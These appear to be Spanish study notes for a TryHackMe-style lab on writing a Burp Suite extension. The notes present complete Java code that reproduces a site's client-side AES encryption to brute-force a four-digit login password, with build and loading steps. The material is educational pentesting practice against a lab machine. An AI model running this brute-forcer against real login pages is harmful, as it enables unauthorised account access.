---
layout: apunte
title: "3. Creating a Basic Burp Extension"
---

Ahora que ya entendemos cómo funcionan las extensiones de Burp, vamos a crear una extensión de Burp simple para permitir la automatización al hacerle pentesting a un sitio web. En esta tarea bypassearemos la autentificación de una página web.

!**Pasted image 20260324143315.png|456**

Durante la fase de reconocimiento, encontramos que `ecorp_user` es el nombre de usuario para el sitio web y que la contraseña contiene 4 dígitos, lo que significa que la contraseña correcta se encuentra entre 0000 y 9999. Sin embargo, durante el análisis del código, nos damos cuenta de que el username y la password no se mandan directamente al endpoint `/login` sino que se encriptan antes de la subida. Analizando el script del lado del cliente `/static/form-submit.js` podemos ver que el código genera una clave AES, encripta el username y la password y luego encodea la información antes de mandar la petición.

```python
const rawAesKey = window.crypto.getRandomValues(new Uint8Array(16));

const aesKey = await getSecretKey(rawAesKey);

let rawdata = "username=" + formDataObj["username"] + "&password=" + formDataObj["password"];

let data = window.btoa(String.fromCharCode(new Uint8Array(await encryptMessage(aesKey, enc.encode(rawdata).buffer))));
```

-------------------------------
<h2>El Reto</h2>
Como pentester, necesitamos automatizar el proceso de fuerza bruta. Como el interceptor e intruder de Burp no pueden manejar encriptación personalizada, debemos desarrollar una extensión de Burp personalizada para automatizar el ataque. Aquí es donde las extensiones de Burp entran en juego, permitiéndonos replicar el proceso de encriptación a través de código personalizado y realizar ataques de fuerza bruta para el escenario.

---------------------------------------
<h2>Fundamentos de las Extensiones de Burp</h2>
Una extensión de Burp es esencialmente un archivo `JAR` que es cargado en BurpSuite para extender su funcionalidad. Estas extensiones están escritas en Java u otros lenguajes soportados e interaccionan directamente con la API de Burp Suite para automatizar el pentesting. Para crear una extensión de Burp necesitamos:

- Escribir una clase Java implementando BurpExtension.
- Usar `MontoyaApi` para interactuar con BurpSuite.
- Compilar el programa en un archivo JAR y cargarlo en Burp Suite.

-------------------------------------
<h2>Desarrollando la Extensión</h2>
Trabajaremos con VS Code para explorar y modificar la extensión de Burp Suite. Tendremos la siguiente estructura:

```python
101Burp/
│── src/
│   ├── main/
│   │   ├── java/
│   │   │   ├── BruteForce.java  <-- Main Source Code
│── build.gradle  <-- Contains dependencies
│── settings.gradle  
│── gradlew  
│── gradlew.bat  
```

>[!IMPORTANT] En la siguiente página tienes los archivos completos.

Cada uno de estos archivos y directorios juega un rol en configurar y ejecutar nuestra extensión.

- `src/main/java/BruteForce.java`: Es el archivo Java principal que contiene el código fuente para nuestra extensión de Burp.
- `build.gradle`: Es el archivo de configuración de Gradle, el cual gestiona dependencias y compila el proyecto. Dentro de este archivo, podemos ver una linea importante: `compileOnly("net.portswigger.burp.extensions:montoya-api:2025.2")`, lo que importa la API Montoya, que es esencial para integrar nuestra extensión en Burp Suite.
- `settings.gradle`: Especifica el nombre del proyecto y otras configuraciones de Gradle.

Siguiendo, navega al archivo `src/main/java/BruteForce.java` en el panel de exploración de VS Code y haz doble click en `BruteForce.java` para abrir el archivo. Veremos las funciones importantes de dicho archivo.

<h3>Método de Inicialización</h3>
```java
@Override

public void initialize(MontoyaApi api) {
    this.api = api;
    api.extension().setName("Burp Password Brute-Forcer");
    SwingUtilities.invokeLater(this::createUI);
}
```

Es el punto de entrada para la extensión de Burp. Cuando Burp carga la extensión, este método es invocado. Configura el nombre de la extensión en Burp Suite usando `api.extension().setName("Burp Password Brute-Forcer")`. Además, este método asegura que la UI para la extensión es creada usando la función `SwingUtilities.invokeLater(this::createUI)`.

<h3>Método de Creación UI</h3>
```java
private void createUI() {
    JFrame frame = new JFrame("Brute Force Attack");
    frame.setSize(300, 180);
    frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
    frame.setLayout(new GridBagLayout());
    frame.setResizable(false);

    GridBagConstraints gbc = new GridBagConstraints();
    gbc.insets = new Insets(5, 5, 5, 5);

    gbc.fill = GridBagConstraints.HORIZONTAL;
    gbc.gridx = 0;
    gbc.gridy = 0;
    frame.add(new JLabel("Username:"), gbc);
    JTextField usernameField = new JTextField("ecorp_user");
    gbc.gridx = 1;
    frame.add(usernameField, gbc);
    gbc.gridx = 0;
    gbc.gridy = 1;
    frame.add(new JLabel("Server URL:"), gbc);
    JTextField urlField = new JTextField("SECOND_VM_IP:8443");
    gbc.gridx = 1;
    frame.add(urlField, gbc);
    JButton startButton = new JButton("Start Attack");
    gbc.gridx = 0;
    gbc.gridy = 2;
    gbc.gridwidth = 2;
    gbc.fill = GridBagConstraints.CENTER;
    frame.add(startButton, gbc);
    frame.setLocationRelativeTo(null);
    frame.setVisible(true);
    startButton.addActionListener((ActionEvent e) -> {
        frame.dispose();
        new Thread(() -> startBruteForce(usernameField.getText().trim(), urlField.getText().trim())).start();
    });
}
```

El método createUI es responsable de construir la GUI para la extensión. Crea una ventana simple JFrame con dos campos de texto etiquetados para el username y la URL del servidor, junto con un botón de comenzar ataque. Cuando se pincha el botón, comienza un nuevo thread que llama a `startBruteForce()`. Esto asegura que el ataque se ejecuta en segundo plano, manteniendo la UI con respuesta.

<h3>El Método de Comenzar la Fuerza Bruta</h3>
```java
private void startBruteForce(String username, String serverUrl) {
	if (username.isEmpty() || serverUrl.isEmpty()) {
		api.logging().logToOutput("Invalid input: Username or URL is empty.");
		return;
	}

	api.logging().logToOutput("Starting password brute-force on " + serverUrl + " with username: " + username);

	String[] parts = serverUrl.split(":");
	if (parts.length != 2) {
		api.logging().logToOutput("Error: Invalid server URL format. Use format: 10.10.188.207:8443");
		return;
	}

	String host = parts[0];
	int port;
	try {
		port = Integer.parseInt(parts[1]);
	} catch (NumberFormatException e) {
		api.logging().logToOutput("Error: Invalid port number.");
		return;
	}

	HttpService httpService = HttpService.httpService(host, port, true);

	for (int i = 1; i <= 9999; i++) {
		String password = String.format("%04d", i);

		try {
			SecretKey aesKey = generateAESKey();
			String encodedKey = base64EncodeWithPadding(aesKey.getEncoded());

			String rawdata = "username=" + username + "&password=" + password;
			byte[] encryptedData = encryptAES(rawdata, aesKey);
			String encodedData = base64EncodeWithPadding(encryptedData);

			String postBody = "mac=" + URLEncoder.encode(encodedKey, "UTF-8") +
					"&data=" + URLEncoder.encode(encodedData, "UTF-8");

			HttpRequest request = HttpRequest.httpRequest(httpService, createHttpRequest(postBody, host));
			HttpResponse response = api.http().sendRequest(request).response();

			int statusCode = response.statusCode();
			String responseBody = response.bodyToString();

			api.logging().logToOutput("Password: " + password +
					" | Status: " + statusCode +
					" | Response: " + responseBody);

			if (statusCode == 200 && responseBody.contains("result=")) {
				try {
					String encryptedBase64 = responseBody.split("=")[1].trim();
					String base64Decoded = java.net.URLDecoder.decode(encryptedBase64, StandardCharsets.UTF_8);
					byte[] decodedEncryptedData = Base64.getDecoder().decode(base64Decoded);
					byte[] decodedKey = Base64.getDecoder().decode(encodedKey);
					String decryptedResult = decryptAES(decodedKey, decodedEncryptedData);

					api.logging().logToOutput("Decryption Success: " + decryptedResult);

					SwingUtilities.invokeLater(() ->
							JOptionPane.showMessageDialog(null,
									"Success! Password is: " + password +
											"\nDecrypted Response: " + decryptedResult,
									"Brute Force Success",
									JOptionPane.INFORMATION_MESSAGE)
					);

				} catch (Exception e) {
					api.logging().logToError("Decryption Failed: " + e.getMessage());
				}
				break;
			}

			if (statusCode == 500) {
				api.logging().logToOutput(" Server returned 500, waiting before retrying...");
				Thread.sleep(1000);
			}

		} catch (Exception e) {
			api.logging().logToError("Error on password " + password + ": " + e.getMessage());
		}
	}

	api.logging().logToOutput("Brute-force complete!");
}
```

El método startBruteForce realiza el ataque iterando entre valores de contraseña desde 0001 hasta 9999. Construye la petición encriptada, la manda al servidor y registra la respuesta. Si se encuentra una contraseña válida, se muestra un mensaje de éxito.

<h3>El Método de Crear la Petición HTTP</h3>
```java
private String createHttpRequest(String body, String serverUrl) {

    return "POST /login HTTP/1.1\r\n" +

            "Host: " + serverUrl + "\r\n" +

            "Content-Type: application/x-www-form-urlencoded\r\n" +

            "Content-Length: " + body.length() + "\r\n" +

            "\r\n" +

            body;

}
```

El método createHttpResponse es responsable de mandar peticiones HTTP personalizadas. Construye una petición POST con los headers y body necesarios. Este método asegura que cata petición esté estructurada correctamente antes de ser mandada al servidor objetivo.

-------------------------------------------
<h2>Construir la Extensión de Burp</h2>
Ahora que entendemos la estructura y funcionalidad básica de nuestra extensión de Burp, es hora de construirla y compilarla.

- Para comenzar, abrimos la terminal y vamos al directorio del proyecto.
- Una vez allí, introducimos el comando `gradle build`.

```shell-session
ubuntu@tryhackme:~/101Burp$ gradle build  Starting a Gradle Daemon, 1 incompatible and 1 stopped Daemons could not be reused, use --status for details

[...]

Configuration on demand is an incubating feature.

BUILD SUCCESSFUL in 12s
2 actionable tasks: 2 executed
```

Si obtenemos este output es que todo ha salido bien y el archivo JAR compilado estará guardado por defecto en `/101Burp/build/libs/` con el nombre `101Burp-1.0-SNAPSHOT.jar`.

------------------------------------------
<h2>Importar la Extensión en Burp</h2>
Ahora que hemos construido exitosamente nuestra extensión para Burp, el siguiente paso es cargarla en Burp Suite. Para hacer esto, abrimos Burp Suite y navegamos hasta la pestaña `Extensions`. En esta pestaña haz click en el botón `Add` para comenzar el proceso de importación. Una nueva ventana aparecerá, preguntando por los detalles de la extensión. Haz click en `Select File`, navega hasta el directorio `/101Burp/build/libs/` y elige el archivo JAR que generamos antes.

!**Pasted image 20260325130253.png**

Una vez seleccionado, haz click en `Next` para proceder y la extensión cargada será ejecutada. Obtendrás la siguiente pantalla. Introduce `ecorp_user` como username y `IP_MÁQUINA:8443` como dirección del servidor. Haz click en comenzar ataque.

!**Pasted image 20260325130412.png**

Cuando le des, la extensión comenzará a funcionar y te mostrará la contraseña cuando la encuentre.